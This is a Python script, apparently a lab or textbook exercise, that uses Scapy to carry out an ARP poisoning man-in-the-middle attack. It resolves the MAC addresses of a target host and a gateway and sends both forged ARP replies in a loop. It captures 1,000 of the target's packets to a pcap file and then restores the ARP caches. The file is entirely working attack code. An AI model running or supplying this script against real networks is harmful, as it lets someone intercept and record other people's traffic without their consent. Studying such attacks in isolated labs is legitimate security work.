from scapy.all import *
import os
import sys
import threading
import signal

from scapy.layers.l2 import ARP, Ether


"""
using Scapy to run arp poison
"""
interface = "ens33"
target_ip = "192.168.29.128"
gateway_ip = "192.168.29.2"
packet_count = 1000


def start_poison(gateway_ip,gateway_mac,target_ip,target_mac):
    poison_target = ARP()
    poison_target.op=2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("start arp poison.....")

    while True:
        try:
            send(poison_gateway)
            send(poison_target)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)


def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    print("Restoring target...")
    # send to target machine
    send(ARP(op=2,pdst=target_ip,psrc=gateway_ip,hwsrc=gateway_mac,hwdst="ff:ff:ff:ff:ff:ff"),count=5)
    # send to gateway
    send(ARP(op=2,pdst=gateway_ip,psrc=target_ip,hwsrc=target_mac,hwdst="ff:ff:ff:ff:ff:ff"),count=5)
    os.kill(os.getpid(),signal.SIGINT)


def get_mac(ip_addr):
    response,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_addr),timeout=2,retry=10)
    for s,r in response:
        return r[Ether].src
    return None


def main():
    conf.iface = interface
    conf.verb = 0
    print("setting up %s"%interface)

    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print("fail to get gateway mac!!Exiting.")
        sys.exit(0)
    else:
        print("Gateway %s is at %s"%(gateway_ip,gateway_mac))

    target_mac = get_mac(target_ip)
    if target_mac is None:
        print("fail to get target mac!!Exiting.")
        sys.exit(0)
    else:
        print("Target %s is at %s"%(target_ip,target_mac))

    poison_thread = threading.Thread(target=start_poison,args=(gateway_ip,gateway_mac,target_ip,target_mac))
    # add to stop child thread when parent thread stop by ctrl-c
    poison_thread.setDaemon(True)
    poison_thread.start()
    try:
        print("start sniffer for %d packets"%packet_count)
        bpf_filter = "ip host %s"%target_ip
        packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)
        wrpcap("arper.pcap",packets)
        restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    except KeyboardInterrupt:
        restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
        print("ready to exit")
        sys.exit(0)


if __name__ == '__main__':
    main()